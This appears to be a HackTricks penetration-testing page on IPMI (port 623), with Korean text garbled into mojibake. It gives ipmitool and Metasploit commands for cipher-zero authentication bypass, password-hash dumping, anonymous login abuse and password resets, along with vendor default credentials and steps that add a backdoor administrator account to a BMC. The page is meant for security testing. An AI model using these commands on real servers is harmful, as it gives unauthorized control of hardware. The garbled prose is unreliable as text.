# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

### **IPMI ê°œìš”**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)**ëŠ” ìš´ì˜ ì²´ì œë‚˜ ì „ì› ìƒíƒœì™€ ê´€ê³„ì—†ì´ ì»´í“¨í„° ì‹œìŠ¤í…œì˜ ì›ê²© ê´€ë¦¬ ë° ëª¨ë‹ˆí„°ë§ì„ ìœ„í•œ í‘œì¤€í™”ëœ ì ‘ê·¼ ë°©ì‹ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ì‹œìŠ¤í…œ ê´€ë¦¬ìê°€ ì‹œìŠ¤í…œì´ êº¼ì ¸ ìˆê±°ë‚˜ ì‘ë‹µí•˜ì§€ ì•Šì„ ë•Œì—ë„ ì›ê²©ìœ¼ë¡œ ì‹œìŠ¤í…œì„ ê´€ë¦¬í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë©°, íŠ¹íˆ ìœ ìš©í•œ ê²½ìš°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- OS ë¶€íŒ… ì „ êµ¬ì„±
- ì „ì› ê´€ë¦¬
- ì‹œìŠ¤í…œ ì¥ì•  ë³µêµ¬

IPMIëŠ” ì˜¨ë„, ì „ì••, íŒ¬ ì†ë„ ë° ì „ì› ê³µê¸‰ ì¥ì¹˜ë¥¼ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆìœ¼ë©°, ì¸ë²¤í† ë¦¬ ì •ë³´ ì œê³µ, í•˜ë“œì›¨ì–´ ë¡œê·¸ ê²€í†  ë° SNMPë¥¼ í†µí•œ ê²½ê³  ì „ì†¡ ê¸°ëŠ¥ë„ ì œê³µí•©ë‹ˆë‹¤. ì‘ë™ì— í•„ìˆ˜ì ì¸ ìš”ì†ŒëŠ” ì „ì› ê³µê¸‰ ì¥ì¹˜ì™€ LAN ì—°ê²°ì…ë‹ˆë‹¤.

1998ë…„ Intelì— ì˜í•´ ë„ì…ëœ ì´í›„, IPMIëŠ” ì—¬ëŸ¬ ê³µê¸‰ì—…ì²´ì— ì˜í•´ ì§€ì›ë˜ì–´ ì›ê²© ê´€ë¦¬ ê¸°ëŠ¥ì„ í–¥ìƒì‹œì¼°ìœ¼ë©°, íŠ¹íˆ 2.0 ë²„ì „ì˜ LANì„ í†µí•œ ì§ë ¬ ì§€ì›ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. ì£¼ìš” êµ¬ì„± ìš”ì†ŒëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- **Baseboard Management Controller (BMC):** IPMI ì‘ì—…ì„ ìœ„í•œ ì£¼ìš” ë§ˆì´í¬ë¡œ ì»¨íŠ¸ë¡¤ëŸ¬.
- **í†µì‹  ë²„ìŠ¤ ë° ì¸í„°í˜ì´ìŠ¤:** ICMB, IPMB ë° ë‹¤ì–‘í•œ ë¡œì»¬ ë° ë„¤íŠ¸ì›Œí¬ ì—°ê²°ì„ ìœ„í•œ ì¸í„°í˜ì´ìŠ¤ë¥¼ í¬í•¨í•œ ë‚´ë¶€ ë° ì™¸ë¶€ í†µì‹ ì„ ìœ„í•œ ê²ƒ.
- **IPMI ë©”ëª¨ë¦¬:** ë¡œê·¸ ë° ë°ì´í„°ë¥¼ ì €ì¥í•˜ê¸° ìœ„í•œ ê²ƒ.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**ê¸°ë³¸ í¬íŠ¸**: 623/UDP/TCP (ë³´í†µ UDPì—ì„œ ì‹¤í–‰ë˜ì§€ë§Œ TCPì—ì„œë„ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤)

## Enumeration

### Discovery
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
You can **identify** the **version** using:  
ë‹¹ì‹ ì€ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ **ë²„ì „**ì„ **ì‹ë³„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI ì·¨ì•½ì 

IPMI 2.0 ì˜ì—­ì—ì„œ Dan Farmerì— ì˜í•´ ì¤‘ìš”í•œ ë³´ì•ˆ ê²°í•¨ì´ ë°œê²¬ë˜ì—ˆìœ¼ë©°, **cipher type 0**ì„ í†µí•´ ì·¨ì•½ì ì´ ë…¸ì¶œë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ [Dan Farmerì˜ ì—°êµ¬](http://fish2.com/ipmi/cipherzero.html)ì—ì„œ ìì„¸íˆ ë¬¸ì„œí™”ë˜ì–´ ìˆìœ¼ë©°, ìœ íš¨í•œ ì‚¬ìš©ìê°€ ëª©í‘œë¡œ ì‚¼ì„ ê²½ìš° ì œê³µëœ ë¹„ë°€ë²ˆí˜¸ë¡œ ë¬´ë‹¨ ì ‘ê·¼ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ ì•½ì ì€ HP, Dell, Supermicroì™€ ê°™ì€ ì œì¡°ì—…ì²´ì˜ ë‹¤ì–‘í•œ BMCì—ì„œ ë°œê²¬ë˜ì–´ ëª¨ë“  IPMI 2.0 êµ¬í˜„ì—ì„œ ê´‘ë²”ìœ„í•œ ë¬¸ì œë¥¼ ì‹œì‚¬í•©ë‹ˆë‹¤.

### **Cipher 0ì„ í†µí•œ IPMI ì¸ì¦ ìš°íšŒ**

ì´ ê²°í•¨ì„ íƒì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒì˜ Metasploit ë³´ì¡° ìŠ¤ìºë„ˆë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
ì´ ê²°í•¨ì˜ ì•…ìš©ì€ ì•„ë˜ì—ç¤ºëœ `ipmitool`ì„ ì‚¬ìš©í•˜ì—¬ ê°€ëŠ¥í•˜ë©°, ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ì˜ ë‚˜ì—´ ë° ìˆ˜ì •ì„ í—ˆìš©í•©ë‹ˆë‹¤:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP ì¸ì¦ ì›ê²© ë¹„ë°€ë²ˆí˜¸ í•´ì‹œ ê²€ìƒ‰**

ì´ ì·¨ì•½ì ì€ ê¸°ì¡´ ì‚¬ìš©ì ì´ë¦„ì— ëŒ€í•œ ì†”íŠ¸ê°€ ì¶”ê°€ëœ í•´ì‹œ ë¹„ë°€ë²ˆí˜¸(MD5 ë° SHA1)ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ Metasploitì€ ëª¨ë“ˆì„ ì œê³µí•©ë‹ˆë‹¤:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI ìµëª… ì¸ì¦**

ë§ì€ BMCì˜ ê¸°ë³¸ êµ¬ì„±ì€ null ì‚¬ìš©ì ì´ë¦„ ë° ë¹„ë°€ë²ˆí˜¸ ë¬¸ìì—´ë¡œ íŠ¹ì§•ì§€ì–´ì§€ëŠ” "ìµëª…" ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤. ì´ êµ¬ì„±ì€ `ipmitool`ì„ ì‚¬ìš©í•˜ì—¬ ëª…ëª…ëœ ì‚¬ìš©ì ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸**

IPMI 2.0ì˜ ì¤‘ìš”í•œ ì„¤ê³„ ì„ íƒì€ ì¸ì¦ ëª©ì ìœ¼ë¡œ BMC ë‚´ì— í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì €ì¥í•´ì•¼ í•¨ì„ ìš”êµ¬í•©ë‹ˆë‹¤. Supermicroê°€ ì´ëŸ¬í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ `/nv/PSBlock` ë˜ëŠ” `/nv/PSStore`ì™€ ê°™ì€ ìœ„ì¹˜ì— ì €ì¥í•˜ëŠ” ê²ƒì€ ì‹¬ê°í•œ ë³´ì•ˆ ë¬¸ì œë¥¼ ì•¼ê¸°í•©ë‹ˆë‹¤:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP ì·¨ì•½ì **

Supermicroì˜ IPMI íŒì›¨ì–´ì— UPnP SSDP ë¦¬ìŠ¤ë„ˆë¥¼ í¬í•¨í•˜ëŠ” ê²ƒì€ íŠ¹íˆ UDP í¬íŠ¸ 1900ì—ì„œ ì‹¬ê°í•œ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤. [Rapid7ì˜ ê³µê°œ](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play)ì—ì„œ ìì„¸íˆ ì„¤ëª…ëœ Intel SDK for UPnP Devices ë²„ì „ 1.3.1ì˜ ì·¨ì•½ì ì€ BMCì— ëŒ€í•œ ë£¨íŠ¸ ì ‘ê·¼ì„ í—ˆìš©í•©ë‹ˆë‹¤:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HPëŠ” ì œì¡° ì¤‘ì—** **Integrated Lights Out (iLO)** **ì œí’ˆì˜ ê¸°ë³¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë¬´ì‘ìœ„ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.** ì´ ê´€í–‰ì€ **ì •ì  ê¸°ë³¸ ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ëŠ” ë‹¤ë¥¸ ì œì¡°ì—…ì²´ì™€ ëŒ€ì¡°ì ì…ë‹ˆë‹¤. ë‹¤ì–‘í•œ ì œí’ˆì— ëŒ€í•œ ê¸°ë³¸ ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ ìš”ì•½ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- **HP Integrated Lights Out (iLO)**ëŠ” ê¸°ë³¸ ë¹„ë°€ë²ˆí˜¸ë¡œ **ê³µì¥ì—ì„œ ë¬´ì‘ìœ„ë¡œ ìƒì„±ëœ 8ì ë¬¸ìì—´**ì„ ì‚¬ìš©í•˜ì—¬ ë” ë†’ì€ ë³´ì•ˆ ìˆ˜ì¤€ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.
- **Dellì˜ iDRAC, IBMì˜ IMM**, ë° **Fujitsuì˜ Integrated Remote Management Controller**ì™€ ê°™ì€ ì œí’ˆì€ ê°ê° "calvin", "PASSW0RD" (0 í¬í•¨), "admin"ê³¼ ê°™ì€ ì‰½ê²Œ ì¶”ì¸¡í•  ìˆ˜ ìˆëŠ” ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
- ìœ ì‚¬í•˜ê²Œ, **Supermicro IPMI (2.0), Oracle/Sun ILOM**, ë° **ASUS iKVM BMC**ë„ ê°ê° "ADMIN", "changeme", "admin"ê³¼ ê°™ì€ ê°„ë‹¨í•œ ê¸°ë³¸ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.


## Accessing the Host via BMC

Baseboard Management Controller (BMC)ì— ëŒ€í•œ ê´€ë¦¬ ì•¡ì„¸ìŠ¤ëŠ” í˜¸ìŠ¤íŠ¸ì˜ ìš´ì˜ ì²´ì œì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ ê²½ë¡œë¥¼ ì—½ë‹ˆë‹¤. ê°„ë‹¨í•œ ì ‘ê·¼ ë°©ì‹ì€ BMCì˜ í‚¤ë³´ë“œ, ë¹„ë””ì˜¤, ë§ˆìš°ìŠ¤ (KVM) ê¸°ëŠ¥ì„ ì•…ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” GRUBë¥¼ í†µí•´ ë£¨íŠ¸ ì…¸ë¡œ í˜¸ìŠ¤íŠ¸ë¥¼ ì¬ë¶€íŒ…í•˜ê±°ë‚˜ ê°€ìƒ CD-ROMì—ì„œ ë³µêµ¬ ë””ìŠ¤í¬ë¡œ ë¶€íŒ…í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë°©ë²•ì€ í˜¸ìŠ¤íŠ¸ì˜ ë””ìŠ¤í¬ë¥¼ ì§ì ‘ ì¡°ì‘í•  ìˆ˜ ìˆê²Œ í•˜ë©°, ë°±ë„ì–´ ì‚½ì…, ë°ì´í„° ì¶”ì¶œ ë˜ëŠ” ë³´ì•ˆ í‰ê°€ë¥¼ ìœ„í•œ í•„ìš”í•œ ì‘ì—…ì„ í¬í•¨í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŠ” í˜¸ìŠ¤íŠ¸ë¥¼ ì¬ë¶€íŒ…í•´ì•¼ í•˜ë¯€ë¡œ ìƒë‹¹í•œ ë‹¨ì ì´ ìˆìŠµë‹ˆë‹¤. ì¬ë¶€íŒ… ì—†ì´ ì‹¤í–‰ ì¤‘ì¸ í˜¸ìŠ¤íŠ¸ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì€ ë” ë³µì¡í•˜ë©° í˜¸ìŠ¤íŠ¸ì˜ êµ¬ì„±ì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤. í˜¸ìŠ¤íŠ¸ì˜ ë¬¼ë¦¬ì  ë˜ëŠ” ì§ë ¬ ì½˜ì†”ì´ ë¡œê·¸ì¸ëœ ìƒíƒœë¼ë©´ BMCì˜ KVM ë˜ëŠ” LANì„ í†µí•œ ì§ë ¬ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ ì‰½ê²Œ ì¥ì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. i2c ë²„ìŠ¤ ë° Super I/O ì¹©ê³¼ ê°™ì€ ê³µìœ  í•˜ë“œì›¨ì–´ ë¦¬ì†ŒìŠ¤ì˜ ì•…ìš©ì„ íƒìƒ‰í•˜ëŠ” ê²ƒì€ ì¶”ê°€ ì¡°ì‚¬ê°€ í•„ìš”í•œ ì˜ì—­ì…ë‹ˆë‹¤.

## Introducing Backdoors into BMC from the Host

BMCê°€ ì¥ì°©ëœ í˜¸ìŠ¤íŠ¸ë¥¼ ì†ìƒì‹œí‚¤ë©´, **ë¡œì»¬ BMC ì¸í„°í˜ì´ìŠ¤ë¥¼ í™œìš©í•˜ì—¬ ë°±ë„ì–´ ì‚¬ìš©ì ê³„ì •ì„ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ì´ëŠ” ì„œë²„ì— ì§€ì†ì ì¸ ì¡´ì¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì´ ê³µê²©ì€ ì†ìƒëœ í˜¸ìŠ¤íŠ¸ì— **`ipmitool`**ì´ ì¡´ì¬í•˜ê³  BMC ë“œë¼ì´ë²„ ì§€ì›ì´ í™œì„±í™”ë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì€ ì¸ì¦ ì—†ì´ í˜¸ìŠ¤íŠ¸ì˜ ë¡œì»¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ BMCì— ìƒˆ ì‚¬ìš©ì ê³„ì •ì„ ì£¼ì…í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ Linux, Windows, BSD, ì‹¬ì§€ì–´ DOSë¥¼ í¬í•¨í•œ ë‹¤ì–‘í•œ ìš´ì˜ ì²´ì œì— ì ìš© ê°€ëŠ¥í•©ë‹ˆë‹¤.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
